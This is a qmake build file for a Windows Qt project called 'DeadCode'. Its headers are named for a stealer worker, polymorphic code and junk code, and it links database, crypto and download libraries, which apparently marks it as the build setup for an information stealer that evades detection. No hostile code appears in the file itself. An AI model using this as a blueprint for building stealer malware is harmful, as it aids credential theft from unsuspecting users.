# Основные модули Qt
QT += core gui network widgets qml quick

TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза (динамическая сборка Qt)
CONFIG += release

# Исходные файлы
SOURCES += \
    $$PWD/../src/main.cpp \
    $$PWD/mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    $$PWD/mainwindow.h \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h

# Формы Qt Designer
FORMS += \
    $$PWD/mainwindow.ui

# Файл ресурсов (ручная обработка)
RC_FILE = $$PWD/../icon.rc

# Пути для поиска заголовков
INCLUDEPATH += \
    $$PWD/../src \
    $$PWD \
    C:/vcpkg/installed/x64-mingw-static/include

# Библиотеки для линковки
LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32 \
        -luser32 \
        -ladvapi32 \
        -lwininet \
        -lshell32 \
        -lurlmon \
        -lole32 \
        -lmsvcrt

# Флаги компилятора
QMAKE_CXXFLAGS += -O2 \
                  -std=c++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS \
                  -Wno-deprecated-declarations \
                  -Wno-cast-function-type

# Флаги линковщика
QMAKE_LFLAGS += -O2 \
                -Wl,-s \
                -Wl,-subsystem,windows \
                -mthreads

# Определения для BUILD_DATE и BUILD_VERSION
DEFINES += BUILD_DATE=\\\"2025-04-06\\\" \
           BUILD_VERSION=\\\"f7bdaed\\\"

# Директории для сборки
DESTDIR = $$PWD/../build/release
OBJECTS_DIR = $$PWD/../build/release
MOC_DIR = $$PWD/../build/release
UI_DIR = $$PWD/../build/release

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
        DESTDIR = $$PWD/../build/debug
        OBJECTS_DIR = $$PWD/../build/debug
        MOC_DIR = $$PWD/../build/debug
        UI_DIR = $$PWD/../build/debug
        QMAKE_CLEAN += \
            $$DESTDIR/DeadCode.exe \
            $$OBJECTS_DIR/*.o \
            $$MOC_DIR/moc_*.cpp \
            $$UI_DIR/ui_*.h
    }
}

# Зависимости для пересборки
PRE_TARGETDEPS += \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$UI_DIR/ui_mainwindow.h